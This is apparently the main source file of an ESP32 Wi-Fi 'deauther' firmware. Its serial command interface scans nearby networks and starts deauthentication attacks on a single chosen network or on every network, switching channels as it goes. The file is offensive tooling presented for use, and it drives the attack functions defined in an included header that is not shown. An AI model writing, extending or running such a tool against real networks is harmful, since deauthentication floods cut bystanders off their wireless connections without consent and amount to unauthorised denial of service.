#include <WiFi.h>
#include <esp_wifi.h>
#include "types.h"
#include "deauth.h"
#include "definitions.h"

// Вспомогательная функция для получения типа шифрования (скопирована из web_interface.cpp)
String getEncryptionType(wifi_auth_mode_t encryptionType) {
    switch (encryptionType) {
        case WIFI_AUTH_OPEN: return "Open";
        case WIFI_AUTH_WEP: return "WEP";
        case WIFI_AUTH_WPA_PSK: return "WPA_PSK";
        case WIFI_AUTH_WPA2_PSK: return "WPA2_PSK";
        case WIFI_AUTH_WPA_WPA2_PSK: return "WPA_WPA2_PSK";
        case WIFI_AUTH_WPA2_ENTERPRISE: return "WPA2_ENTERPRISE";
        default: return "UNKNOWN";
    }
}

// Прототипы обработчиков команд
void handleSerialCommand(String cmd);

int curr_channel = 1;

void setup() {
    #ifdef SERIAL_DEBUG
    Serial.begin(115200);
    #endif

    #ifdef LED
    pinMode(LED, OUTPUT);
    #endif

    WiFi.mode(WIFI_MODE_STA);
    WiFi.disconnect();
    delay(100);

    DEBUG_PRINTLN("ESP32-Deauther Serial Interface Ready");
    DEBUG_PRINTLN("Type 'help' for available commands.");
}

void loop() {
    // Обработка команд из последовательного порта
    if (Serial.available()) {
        String command = Serial.readStringUntil('\n');
        command.trim();
        handleSerialCommand(command);
    }

    // Режим атаки на все сети: переключение каналов
    if (deauth_type == DEAUTH_TYPE_ALL) {
        if (curr_channel > CHANNEL_MAX) curr_channel = 1;
        esp_wifi_set_channel(curr_channel, WIFI_SECOND_CHAN_NONE);
        curr_channel++;
        delay(10);
    }
}

void handleSerialCommand(String cmd) {
    if (cmd == "scan") {
        int n = WiFi.scanNetworks();
        DEBUG_PRINTLN("{\"networks\":[");
        for (int i = 0; i < n; i++) {
            DEBUG_PRINT("  {\"num\":" + String(i) + ",");
            DEBUG_PRINT("\"ssid\":\"" + WiFi.SSID(i) + "\",");
            DEBUG_PRINT("\"bssid\":\"" + WiFi.BSSIDstr(i) + "\",");
            DEBUG_PRINT("\"channel\":" + String(WiFi.channel(i)) + ",");
            DEBUG_PRINT("\"rssi\":" + String(WiFi.RSSI(i)) + ",");
            DEBUG_PRINT("\"enc\":\"" + getEncryptionType(WiFi.encryptionType(i)) + "\"}");
            if (i < n-1) DEBUG_PRINTLN(",");
            else DEBUG_PRINTLN();
        }
        DEBUG_PRINTLN("]}");
    }
    else if (cmd.startsWith("deauth ")) {
        int space1 = cmd.indexOf(' ');
        int space2 = cmd.indexOf(' ', space1+1);
        if (space2 == -1) {
            int net = cmd.substring(space1+1).toInt();
            start_deauth(net, DEAUTH_TYPE_SINGLE, 1);
            DEBUG_PRINTLN("Attack started on network " + String(net));
        } else {
            int net = cmd.substring(space1+1, space2).toInt();
            int reason = cmd.substring(space2+1).toInt();
            start_deauth(net, DEAUTH_TYPE_SINGLE, reason);
            DEBUG_PRINTLN("Attack started on network " + String(net) + " with reason " + String(reason));
        }
    }
    else if (cmd == "deauth_all") {
        start_deauth(0, DEAUTH_TYPE_ALL, 1);
        DEBUG_PRINTLN("Attack started on all networks");
    }
    else if (cmd.startsWith("deauth_all ")) {
        int reason = cmd.substring(11).toInt();
        start_deauth(0, DEAUTH_TYPE_ALL, reason);
        DEBUG_PRINTLN("Attack started on all networks with reason " + String(reason));
    }
    else if (cmd == "stop") {
        stop_deauth();
        DEBUG_PRINTLN("Attack stopped");
    }
    else if (cmd == "help") {
        DEBUG_PRINTLN("Available commands:");
        DEBUG_PRINTLN("  scan                     - scan Wi-Fi networks (outputs JSON)");
        DEBUG_PRINTLN("  deauth <net> [reason]    - deauth specific network (reason optional, default 1)");
        DEBUG_PRINTLN("  deauth_all [reason]      - deauth all networks (reason optional, default 1)");
        DEBUG_PRINTLN("  stop                      - stop current attack");
        DEBUG_PRINTLN("  help                      - show this help");
    }
    else {
        DEBUG_PRINTLN("Unknown command. Type 'help' for list.");
    }
}
